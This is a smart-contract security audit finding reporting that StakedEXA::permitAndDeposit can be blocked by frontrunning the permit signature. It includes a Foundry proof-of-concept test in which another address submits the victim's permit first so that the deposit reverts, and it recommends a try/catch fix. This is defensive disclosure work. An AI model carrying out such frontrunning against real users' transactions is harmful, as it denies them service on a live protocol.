# `StakedEXA::permitAndDeposit` function is vulnerable to DOS via frontrunning

## Summary
Attacker can front run the transactions to `StakedEXA::permitAndDeposit` function, causing them to revert 

## Vulnerability Detail
`StakedEXA::permitAndDeposit` function  is susceptible to DOS via frontrunning. An attacker can observe the transaction in the mempool, extract the permit signature and values from the calldata and execute the permit before the original transaction is processed. This would consume the nonce associated with the user's permit and cause the original transaction to fail due to the now-invalid nonce.

This attack vector has been previously described in [Permission Denied - The Story of an EIP that Sinned](https://www.trust-security.xyz/post/permission-denied) .

## Impact
Transactions will revert due to DOS

## Code Snippet
https://github.com/sherlock-audit/2024-07-exactly-stacking-contracts/blob/main/protocol/contracts/StakedEXA.sol#L173-L176

## Proof of Concept
```javascript
function testPermitAndDeposit() external {
    uint256 assets = 1_000e18;
    exa.mint(BOB, assets);

    (uint8 v, bytes32 r, bytes32 s) = vm.sign(
      BOB_KEY,
      keccak256(
        abi.encodePacked(
          "\x19\x01",
          exa.DOMAIN_SEPARATOR(),
          keccak256(
            abi.encode(
              keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
              BOB,
              address(stEXA),
              assets,
              0,
              block.timestamp
            )
          )
        )
      )
    );

    vm.prank(address(1337));
    exa.permit(BOB, address(stEXA), assets, block.timestamp, v, r, s);

    vm.prank(BOB);
    vm.expectRevert();
    stEXA.permitAndDeposit(assets, BOB, Permit(assets, block.timestamp, v, r, s));
  }
```

## Tool used

Manual Review

## Recommendation
Consider implementing a try/catch block within the`StakedEXA::permitAndDeposit` function. In this block, if the call to permit fails, the contract should execute the deposit anyway if the allowance is sufficient.
